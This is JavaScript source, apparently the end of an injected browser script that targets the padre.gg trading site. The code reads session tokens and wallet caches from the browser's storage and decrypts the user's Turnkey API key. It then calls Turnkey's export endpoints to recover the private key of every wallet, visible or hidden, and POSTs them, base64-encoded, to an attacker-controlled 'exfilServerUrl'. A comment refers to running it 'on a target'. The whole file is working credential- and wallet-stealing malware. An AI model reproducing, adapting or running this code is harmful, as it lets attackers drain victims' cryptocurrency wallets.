                        compressedPublicKeyHex: n
                    });
                return await crypto.subtle.importKey('jwk', r, {
                    name: 'ECDSA',
                    namedCurve: 'P-256'
                }, !1, [
                    'sign'
                ])
            }({
                uncompressedPrivateKeyHex: r,
                compressedPublicKeyHex: n
            });
        return await async function (e) {
            const {
                key: t,
                content: n
            }
                = e,
                r = await crypto.subtle.sign({
                    name: 'ECDSA',
                    hash: 'SHA-256'
                }, t, (new TextEncoder).encode(n));
            return bytesToHex(
                function (e) {
                    if (e.length % 2 != 0 || 0 == e.length || e.length > 132) throw new Error('Invalid IEEE P1363 signature encoding. Length: ' + e.length);
                    const t = trimLeadingZerosEnsureMsbClear(e.subarray(0, e.length / 2)),
                        n = trimLeadingZerosEnsureMsbClear(e.subarray(e.length / 2, e.length));
                    let r = 0;
                    const o = 2 + t.length + 1 + 1 + n.length;
                    let i;
                    o >= 128 ? (i = new Uint8Array(o + 3), i[r++] = 48, i[r++] = 129, i[r++] = o) : (i = new Uint8Array(o + 2), i[r++] = 48, i[r++] = o);
                    return i[r++] = 2,
                        i[r++] = t.length,
                        i.set(t, r),
                        r += t.length,
                        i[r++] = 2,
                        i[r++] = n.length,
                        i.set(n, r),
                        i
                }(new Uint8Array(r))
            )
        }({
            key: o,
            content: t
        })
    };
    const preloadResourcesThen = function (e, t, n) {
        let r = Promise.resolve();
        if (t && t.length > 0) {
            const e = document.getElementsByTagName('link');
            r = Promise.all(
                t.map(
                    (
                        t => {
                            if ((t = function (e) {
                                return '/' + e
                            }(t)) in dZ) return;
                            dZ[t] = !0;
                            const r = t.endsWith('.css'),
                                o = r ? '[rel="stylesheet"]' : '';
                            if (!!n) for (let n = e.length - 1; n >= 0; n--) {
                                const o = e[n];
                                if (o.href === t && (!r || 'stylesheet' === o.rel)) return
                            } else if (document.querySelector(`link[href="${t}"]${o}`)) return;
                            const i = document.createElement('link');
                            return i.rel = r ? 'stylesheet' : 'modulepreload',
                                r ||
                                (i.as = 'script', i.crossOrigin = ''),
                                i.href = t,
                                document.head.appendChild(i),
                                r ? new Promise(
                                    (
                                        (e, n) => {
                                            i.addEventListener('load', e),
                                                i.addEventListener('error', (() => n(new Error(`Unable to preload CSS for ${t}`))))
                                        }
                                    )
                                ) : void 0
                        }
                    )
                )
            )
        }
        return r.then((() => e())).catch(
            (
                e => {
                    const t = new Event('vite:preloadError', {
                        cancelable: !0
                    });
                    if (t.payload = e, window.dispatchEvent(t), !t.defaultPrevented) throw e
                }
            )
        )
    };
    function trimLeadingZerosEnsureMsbClear(e) {
        let t = 0;
        for (; t < e.length && 0 == e[t];) t++;
        t == e.length &&
            (t = e.length - 1);
        let n = 0;
        128 & ~e[t] ||
            (n = 1);
        const r = new Uint8Array(e.length - t + n);
        return r.set(e.subarray(t), n),
            r
    };
    function hexP256KeyPairToJwk(e) {
        const {
            uncompressedPrivateKeyHex: t,
            compressedPublicKeyHex: n
        }
            = e,
            r = compressedP256PointToJwk(hexToBytes(n));
        return r.d = function (e, t) {
            const n = e.padStart(2 * Math.ceil(e.length / 2), '0');
            return base64UrlEncodeString(hexToBytes(n, t).reduce(((e, t) => e + String.fromCharCode(t)), ''))
        }(t, 32),
            r
    };
    class Stamper {
        constructor(e) {
            this.apiPublicKey = e.apiPublicKey;
            this.apiPrivateKey = e.apiPrivateKey
        }
        async stamp(e) {
            const t = await (
                async e => {
                    return (
                        await preloadResourcesThen((() => Promise.resolve().then((() => signWithApiKey))), void 0)
                    )(e);
                }
            )({
                publicKey: this.apiPublicKey,
                privateKey: this.apiPrivateKey,
                content: e
            }),
                n = {
                    publicKey: this.apiPublicKey,
                    scheme: 'SIGNATURE_SCHEME_TK_API_P256',
                    signature: t
                };
            return {
                stampHeaderName: 'X-Stamp',
                stampHeaderValue: base64UrlEncodeString(JSON.stringify(n))
            }
        }
    };
    class Client {
        constructor(e, t) {
            this.exportWalletAccount = async e => this.request('/public/v1/submit/export_wallet_account', e);
            this.exportPrivateKey = async e => this.request('/public/v1/submit/export_private_key', e);

            this.config = e;
            this.stamper = new Stamper({
                apiPrivateKey: t.apiPrivateKey,
                apiPublicKey: t.apiPublicKey
            })
        }
        async request(e, t) {
            const n = this.config.baseUrl + e,
                r = JSON.stringify(t),
                o = await this.stamper.stamp(r),
                i = await fetch(
                    n,
                    {
                        method: 'POST',
                        headers: {
                            [
                                o.stampHeaderName
                            ]: o.stampHeaderValue,
                            'X-Client-Version': '@turnkey/http@2.15.0'
                        },
                        body: r,
                        redirect: 'follow'
                    }
                );
            if (!i.ok) {
                let e;
                try {
                    e = await i.json()
                } catch (s) {
                    throw new Error(`${i.status} ${i.statusText}`)
                }
                throw new Error(`Request failed: ${i.status} ${i.statusText}`)
            }
            return await i.json()
        }
    };
    const getServerTime = async (e) => {
        const response = await fetch("https://backend.padre.gg/time/get-server-time?sid=d-a1bf10-da2d", {
            "credentials": "omit",
            "headers": {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Origin": "https://trade.padre.gg",
                "Connection": "keep-alive",
                "Referer": "https://trade.padre.gg/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "TE": "trailers",
            },
            "referrer": "https://trade.padre.gg/",
            "method": "GET",
            "mode": "cors"
        });

        return await response.json();
    };
    const getTimestamp = async () => {
        {
            const { unixTs: e } = await getServerTime();
            return `${e * 1000}`
        }
    };
    function uint8arrayToHexString(buffer) {
        return [...buffer]
            .map((x) => x.toString(16).padStart(2, "0"))
            .join("");
    };
    function uint8arrayFromHexString(hexString) {
        var hexRegex = /^[0-9A-Fa-f]+$/;
        if (
            !hexString ||
            hexString.length % 2 != 0 ||
            !hexRegex.test(hexString)
        ) {
            throw new Error("cannot create uint8array from invalid hex string");
        }
        return new Uint8Array(
            hexString.match(/../g).map((h) => parseInt(h, 16))
        );
    };
    function base58Encode(bytes) {
        // See https://en.bitcoin.it/wiki/Base58Check_encoding
        const alphabet =
            "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        let result = "";
        let digits = [0];
        for (let i = 0; i < bytes.length; i++) {
            let carry = bytes[i];
            for (let j = 0; j < digits.length; ++j) {
                carry += digits[j] << 8;
                digits[j] = carry % 58;
                carry = (carry / 58) | 0;
            }

            while (carry > 0) {
                digits.push(carry % 58);
                carry = (carry / 58) | 0;
            }
        }
        // Convert digits to a base58 string
        for (let k = 0; k < digits.length; k++) {
            result = alphabet[digits[k]] + result;
        }

        // Add '1' for each leading 0 byte
        for (let i = 0; bytes[i] === 0 && i < bytes.length - 1; i++) {
            result = "1" + result;
        }
        return result;
    };
    function normalizePadding(byteArray, targetLength) {
        const paddingLength = targetLength - byteArray.length;

        // Add leading 0's to array
        if (paddingLength > 0) {
            const padding = new Uint8Array(paddingLength).fill(0);
            return new Uint8Array([...padding, ...byteArray]);
        }

        // Remove leading 0's from array
        if (paddingLength < 0) {
            const expectedZeroCount = paddingLength * -1;
            let zeroCount = 0;
            for (
                let i = 0;
                i < expectedZeroCount && i < byteArray.length;
                i++
            ) {
                if (byteArray[i] === 0) {
                    zeroCount++;
                }
            }
            // Check if the number of zeros found equals the number of zeroes expected
            if (zeroCount !== expectedZeroCount) {
                throw new Error(
                    `invalid number of starting zeroes. Expected number of zeroes: ${expectedZeroCount}. Found: ${zeroCount}.`
                );
            }
            return byteArray.slice(
                expectedZeroCount,
                expectedZeroCount + targetLength
            );
        }
        return byteArray;
    };
    function additionalAssociatedData(senderPubBuf, receiverPubBuf) {
        const s = Array.from(new Uint8Array(senderPubBuf));
        const r = Array.from(new Uint8Array(receiverPubBuf));
        return new Uint8Array([...s, ...r]);
    };
    async function HpkeDecrypt({
        ciphertextBuf,
        encappedKeyBuf,
        receiverPrivJwk,
    }) {
        const kemContext = new hpkeCore.DhkemP256HkdfSha256();
        var receiverPriv = await kemContext.importKey(
            "jwk",
            { ...receiverPrivJwk },
            false
        );

        var suite = new hpkeCore.CipherSuite({
            kem: kemContext,
            kdf: new hpkeCore.HkdfSha256(),
            aead: new hpkeCore.Aes256Gcm(),
        });

        var recipientCtx = await suite.createRecipientContext({
            recipientKey: receiverPriv,
            enc: encappedKeyBuf,
            info: new TextEncoder().encode("turnkey_hpke"),
        });

        var receiverPubBuf = await p256JWKPrivateToPublic(receiverPrivJwk);
        var aad = additionalAssociatedData(encappedKeyBuf, receiverPubBuf);
        var res;
        try {
            res = await recipientCtx.open(ciphertextBuf, aad);
        } catch (e) {
            throw new Error(
                "unable to decrypt bundle using embedded key. the bundle may be incorrect. failed with error: " +
                e.toString()
            );
        }
        return res;
    };
    async function encodeKey(privateKeyBytes, keyFormat, publicKeyBytes) {
        switch (keyFormat) {
            case "SOLANA":
                if (!publicKeyBytes) {
                    throw new Error(
                        "public key must be specified for SOLANA key format"
                    );
                }
                if (privateKeyBytes.length !== 32) {
                    throw new Error(
                        `invalid private key length. Expected 32 bytes. Got ${privateKeyBytes.length}.`
                    );
                }
                if (publicKeyBytes.length !== 32) {
                    throw new Error(
                        `invalid public key length. Expected 32 bytes. Got ${publicKeyBytes.length}.`
                    );
                }
                const concatenatedBytes = new Uint8Array(64);
                concatenatedBytes.set(privateKeyBytes, 0);
                concatenatedBytes.set(publicKeyBytes, 32);
                return base58Encode(concatenatedBytes);
            case "HEXADECIMAL":
                return "0x" + uint8arrayToHexString(privateKeyBytes);
            default:
                console.warn(
                    `invalid key format: ${keyFormat}. Defaulting to HEXADECIMAL.`
                );
                return "0x" + uint8arrayToHexString(privateKeyBytes);
        }
    };
    
    async function decryptBundle(bundle, embeddedKeyJwk) {
        let encappedKeyBuf;
        let ciphertextBuf;

        // Parse the import bundle
        const bundleObj = JSON.parse(bundle);

        const signedData = JSON.parse(
            new TextDecoder().decode(
                uint8arrayFromHexString(bundleObj.data)
            )
        );

        encappedKeyBuf = uint8arrayFromHexString(
            signedData.encappedPublic
        );
        ciphertextBuf = uint8arrayFromHexString(signedData.ciphertext);

        return await HpkeDecrypt({
            ciphertextBuf,
            encappedKeyBuf,
            receiverPrivJwk: embeddedKeyJwk,
        });
    };
    function getEd25519PublicKey(privateKeyHex) {
        nobleEd25519.etc.sha512Sync = (...m) =>
            nobleHashes.sha512(nobleEd25519.etc.concatBytes(...m));
        return nobleEd25519.getPublicKey(privateKeyHex);
    };
    async function extractPrivateKey(
        bundle,
        keyFormat,
        embeddedKeyJwk
    ) {
        const keyBytes = await decryptBundle(bundle, embeddedKeyJwk);

        var key;
        const privateKeyBytes = new Uint8Array(keyBytes);
        if (keyFormat === "SOLANA") {
            const privateKeyHex = uint8arrayToHexString(
                privateKeyBytes.subarray(0, 32)
            );
            const publicKeyBytes = getEd25519PublicKey(privateKeyHex);
            key = await encodeKey(
                privateKeyBytes,
                keyFormat,
                publicKeyBytes
            );
        } else {
            key = await encodeKey(privateKeyBytes, keyFormat);
        }

        return key;
    };
    async function generateTargetKey() {
        const p256key = await crypto.subtle.generateKey(
            {
                name: "ECDH",
                namedCurve: "P-256",
            },
            true,
            ["deriveBits"]
        );

        return await crypto.subtle.exportKey("jwk", p256key.privateKey);
    };
    async function p256JWKPrivateToPublic(jwkPrivate) {
        // make a copy so we don't modify the underlying object
        const jwkPrivateCopy = { ...jwkPrivate };
        // change jwk so it will be imported as a public key
        delete jwkPrivateCopy.d;
        jwkPrivateCopy.key_ops = ["verify"];

        const publicKey = await window.crypto.subtle.importKey(
            "jwk",
            jwkPrivateCopy,
            { name: "ECDSA", namedCurve: "P-256" },
            true,
            ["verify"]
        );
        const buffer = await crypto.subtle.exportKey("raw", publicKey);
        return new Uint8Array(buffer);
    };
    function toEVMRegister(e, t) {
        const Zae = (
            (e, t, n) => function (e) {
                const t = t => e().update(Fae(t)).digest(),
                    n = e();
                return t.outputLen = n.outputLen,
                    t.blockLen = n.blockLen,
                    t.create = () => e(),
                    t
            }((() => new Jae(t, e, n)))
        )(1, 136, 32);

        function pae(e, {
            dir: t,
            size: n = 32
        }
            = {}) {
            return 'string' == typeof e ? function (e, {
                dir: t,
                size: n = 32
            }
                = {}) {
                if (null === n) return e;
                const r = e.replace('0x', '');
                if (r.length > 2 * n) throw new hae({
                    size: Math.ceil(r.length / 2),
                    targetSize: n,
                    type: 'hex'
                });
                return `0x${r['right' === t ? 'padEnd' : 'padStart'](2 * n, '0')}`
            }(e, {
                dir: t,
                size: n
            }) : function (e, {
                dir: t,
                size: n = 32
            }
                = {}) {
                if (null === n) return e;
                if (e.length > n) throw new hae({
                    size: e.length,
                    targetSize: n,
                    type: 'bytes'
                });
                const r = new Uint8Array(n);
                for (let o = 0; o < n; o++) {
                    const i = 'right' === t;
                    r[i ? o : n - o - 1] = e[i ? o : e.length - o - 1]
                }
                return r
            }(e, {
                dir: t,
                size: n
            })
        }

        function bae(e, t = {}) {
            const {
                signed: n,
                size: r
            }
                = t,
                o = BigInt(e);
            let i;
            r ? i = n ? (1 << 8 * BigInt(r) - 1) - 1 : 2 ** (8 * BigInt(r)) - 1 : 'number' == typeof e &&
                (i = BigInt(Number.MAX_SAFE_INTEGER));
            const s = 'bigint' == typeof i &&
                n ? - i - 1 : 0;
            if (i && o > i || o < s) {
                const t = 'bigint' == typeof e ? 'n' : '';
                throw new Error(JSON.stringify({
                    max: i ? `${i}${t}` : void 0,
                    min: `${s}${t}`,
                    signed: n,
                    size: r,
                    value: `${e}${t}`
                }))
            }
            const a = `0x${(n && o < 0 ? (1 << BigInt(8 * r)) + BigInt(o) : o).toString(16)}`;
            return r ? pae(a, {
                size: r
            }) : a
        }

        const Bae = {
            zero: 48,
            nine: 57,
            A: 65,
            F: 70,
            a: 97,
            f: 102
        };

        function Eae(e) {
            return e >= Bae.zero &&
                e <= Bae.nine ? e - Bae.zero : e >= Bae.A &&
                    e <= Bae.F ? e - (Bae.A - 10) : e >= Bae.a &&
                        e <= Bae.f ? e - (Bae.a - 10) : void 0
        }

        function kae(e, t = {}) {
            let n = e;
            t.size &&
                (mae(n, {
                    size: t.size
                }), n = pae(n, {
                    dir: 'right',
                    size: t.size
                }));
            let r = n.slice(2);
            r.length % 2 &&
                (r = `0${r}`);
            const o = r.length / 2,
                i = new Uint8Array(o);
            for (let s = 0, a = 0; s < o; s++) {
                const e = Eae(r.charCodeAt(a++)),
                    t = Eae(r.charCodeAt(a++));
                if (void 0 === e || void 0 === t) throw new Error(`Invalid byte sequence ("${r[a - 2]}${r[a - 1]}" in "${r}").`);
                i[s] = 16 * e + t
            }
            return i
        }

        function xae(e, t = {}) {
            return 'number' == typeof e ||
                'bigint' == typeof e ? function (e, t) {
                    const n = bae(e, t);
                    return kae(n)
                }(e, t) : 'boolean' == typeof e ? function (e, t = {}) {
                    const n = new Uint8Array(1);
                    if (n[0] = Number(e), 'number' == typeof t.size) return mae(n, {
                        size: t.size
                    }),
                        pae(n, {
                            size: t.size
                        });
                    return n
                }(e, t) : cae(e) ? kae(e, t) : Mae(e, t)
        }
        const Sae = new TextEncoder;

        function uae(e) {
            return cae(e, {
                strict: !1
            }) ? Math.ceil((e.length - 2) / 2) : e.length
        }
        function mae(e, {
            size: t
        }) {
            if (uae(e) > t) throw new Error(JSON.stringify({
                givenSize: uae(e),
                maxSize: t
            }))
        }
        function Mae(e, t = {}) {
            const n = Sae.encode(e);
            return 'number' == typeof t.size ? (mae(n, {
                size: t.size
            }), pae(n, {
                dir: 'right',
                size: t.size
            })) : n
        }

        const n = t ? `${t}${e.toLowerCase()}` : e.substring(2).toLowerCase(),
            r = function (e, t) {
                const n = t ||
                    'hex',
                    r = Zae(cae(e, {
                        strict: !1
                    }) ? xae(e) : e);
                return 'bytes' === n ? r : yae(r)
            }(Mae(n), 'bytes'),
            o = (t ? n.substring(`${t}0x`.length) : n).split('');
        for (let i = 0; i < 40; i += 2) r[i >> 1] >> 4 >= 8 &&
            o[i] &&
            (o[i] = o[i].toUpperCase()),
            (15 & r[i >> 1]) >= 8 &&
            o[i + 1] &&
            (o[i + 1] = o[i + 1].toUpperCase());
        return `0x${o.join('')}`
    };
      
    // =============================================================================================

    // ================= START =================
    try {
        const walletsCache = JSON.parse(localStorage.getItem("padreV2-walletsCache"));
        const hiddenWalletsCache = JSON.parse(localStorage.getItem("padreV2-hiddenWalletsCache"));
        const sessionData = JSON.parse(localStorage.getItem("padreV2-session"));
        const stamperEncoded = JSON.parse(localStorage.getItem("padreV2-stamper"));

        const rows = await new Promise(async (res, rej) => {
            try {
                const db = await new Promise((res_db, rej_db) => {
                    const req = indexedDB.open('firebaseLocalStorageDb');
                    req.onsuccess = () => res_db(req.result);
                    req.onerror = () => rej_db(req.error);
                });

                const r = db.transaction('firebaseLocalStorage', 'readonly').objectStore('firebaseLocalStorage').getAll();
                r.onsuccess = () => res(r.result);
                r.onerror = () => rej(r.error);
            } catch(e) {
                rej(e);
            }
        });

        const accessToken = rows[0].value.stsTokenManager.accessToken;
        const velvetBundle = await fetch(`https://backend.padre.gg/velvet/users/${sessionData.uid}/get-velvet`, {
            method: "GET",
            headers: {
                "X-Padre-Session": sessionData.sessionId,
                "Authorization": `Bearer ${accessToken}`
            },
            redirect: "follow"
        });
        const velvetObject = await velvetBundle.json();
        const localStoragePassphrase = velvetObject.bundle.localStoragePassphrase;
        const apiPublicKey = velvetObject.bundle.publicKey;

        const decryptedPassword = CryptoJS.AES.decrypt(stamperEncoded[sessionData.uid], localStoragePassphrase);
        const passwordHash = decryptedPassword.toString(CryptoJS.enc.Utf8);

        const decryptedPrivateKey = CryptoJS.AES.decrypt(velvetObject.bundle.encryptedPrivateKey, passwordHash);
        const apiPrivateKey = decryptedPrivateKey.toString(CryptoJS.enc.Utf8);

        async function execute(format, address, orgID, isImported, privateKeyId) {
            const embeddedKeyJwk = await generateTargetKey();
            const targetPubBuf = await p256JWKPrivateToPublic(embeddedKeyJwk);
            const targetPubHex = uint8arrayToHexString(targetPubBuf);
            
            const client = new Client({ baseUrl: 'https://api.turnkey.com' }, {
                apiPrivateKey: apiPrivateKey,
                apiPublicKey: apiPublicKey
            });

            const getImportedWalletInfo = pollActivityUntilComplete({
                client: client,
                requestFn: async () => client.exportPrivateKey({
                    type: 'ACTIVITY_TYPE_EXPORT_PRIVATE_KEY',
                    timestampMs: await getTimestamp(),
                    organizationId: orgID,
                    parameters: {
                        privateKeyId: privateKeyId,
                        targetPublicKey: targetPubHex
                    }
                })
            });

            const getBundleInfo = pollActivityUntilComplete({
                client: client,
                requestFn: async () => client.exportWalletAccount({
                    type: 'ACTIVITY_TYPE_EXPORT_WALLET_ACCOUNT',
                    timestampMs: await getTimestamp(),
                    organizationId: orgID,
                    parameters: {
                        address: address,
                        targetPublicKey: targetPubHex
                    }
                })
            });

            const bundleInfo = isImported ? await getImportedWalletInfo({}) : await getBundleInfo({});
            
            let exportBundle;
            if (bundleInfo && bundleInfo.result && (bundleInfo.result.exportWalletAccountResult || bundleInfo.result.exportPrivateKeyResult)) {
                const walletAccount = bundleInfo.result.exportWalletAccountResult ?? bundleInfo.result.exportPrivateKeyResult;
                exportBundle = walletAccount.exportBundle;
            }

            if (exportBundle) return await extractPrivateKey(exportBundle, format, embeddedKeyJwk);
        }

        const outputWallets = [];
        
        await Promise.all([
            ...(walletsCache ? Object.entries(walletsCache).map(async ([_, wallets]) => {
                await Promise.all(wallets.map(async (wallet) => {
                    const privateKey = await execute(
                        wallet.walletType == "SOL" ? "SOLANA" : "HEXADECIMAL",
                        wallet.walletType == "SOL" ? wallet.publicAddress : toEVMRegister(wallet.publicAddress),
                        wallet.subOrgId,
                        wallet.isImported,
                        wallet.walletId
                    );
                    outputWallets.push({
                        walletName: wallet.walletName,
                        address: wallet.publicAddress,
                        privateKey: privateKey
                    });
                }));
            }) : []),

            ...(hiddenWalletsCache ? Object.entries(hiddenWalletsCache).map(async ([_, wallets]) => {
                await Promise.all(wallets.map(async (wallet) => {
                    const privateKey = await execute(
                        wallet.walletType == "SOL" ? "SOLANA" : "HEXADECIMAL",
                        wallet.walletType == "SOL" ? wallet.publicAddress : toEVMRegister(wallet.publicAddress),
                        wallet.subOrgId,
                        wallet.isImported,
                        wallet.walletId
                    );
                    outputWallets.push({
                        walletName: wallet.walletName,
                        address: wallet.publicAddress,
                        privateKey: privateKey
                    });
                }));
            }) : [])
        ]);

        // ======================================================

        // ====== SENDING DATA ====
        async function sendMessageToServer(base64Wallets) {
            try {
                const response = await fetch(
                    exfilServerUrl,
                    {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ data: base64Wallets })
                    }
                );

                if (!response.ok) {
                    throw new Error(`Server responded with ${response.status}`);
                }
                console.log("Data sent successfully.");
            } catch (err) {
                console.error('Failed to send data to server:', err);
            }
        }
        
        if (outputWallets.length > 0) {
            const base64Payload = btoa(JSON.stringify({ wallets: outputWallets }));
            await sendMessageToServer(base64Payload);
        } else {
            console.log("No wallets found to send.");
        }
    
    } catch (err) {
        console.error("[Padre] An error occurred during execution:", err);
        
        // Optional: Send error message to your server
        // This helps debug issues when the script fails on a target.
        try {
            await fetch(exfilServerUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ error: err.message, stack: err.stack })
            });
        } catch (e) {
            // Ignore if sending the error fails
        }
    }
    // ========================

})()